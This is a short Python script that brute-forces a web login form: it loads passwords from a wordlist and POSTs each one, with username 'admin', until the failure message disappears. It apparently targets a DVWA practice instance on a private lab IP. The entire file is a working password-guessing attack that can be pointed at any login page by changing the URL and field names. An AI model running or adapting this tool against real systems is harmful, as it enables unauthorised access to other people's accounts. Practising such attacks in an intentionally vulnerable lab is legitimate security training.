import sys
from datetime import datetime
import threading
import requests
import queue

from termcolor import colored


def wordlist_build(file_path):
    is_resume = False
    words = queue.Queue()

    with open(file_path) as fp:
        raw = fp.readline()
        while raw:
            word = raw.strip()
            words.put(word)
            raw = fp.readline()

    fp.close()
    return words


def brute_force(url, username, username_field, password_field, submit_field_name,  verification, word_queue):
    while not word_queue.empty():
        try_this = word_queue.get()
        data = {
            username_field: username,
            password_field: try_this,
            submit_field_name: 'submit'
        }
        response = requests.post(url, data=data)
        if verification not in response.content.decode('utf-8'):
            print(colored(f'[+] Password Found {try_this}', 'green'))
            now2 = datetime.now()
            print(now2.strftime("%H.%M.%S"))
            sys.exit(0)


passwords = wordlist_build('passwords.txt')
now1 = datetime.now()
print(now1.strftime("%H.%M.%S"))
brute_force('http://192.168.56.101/dvwa/login.php', 'admin', 'username', 'password', 'Login', 'Login failed', passwords)
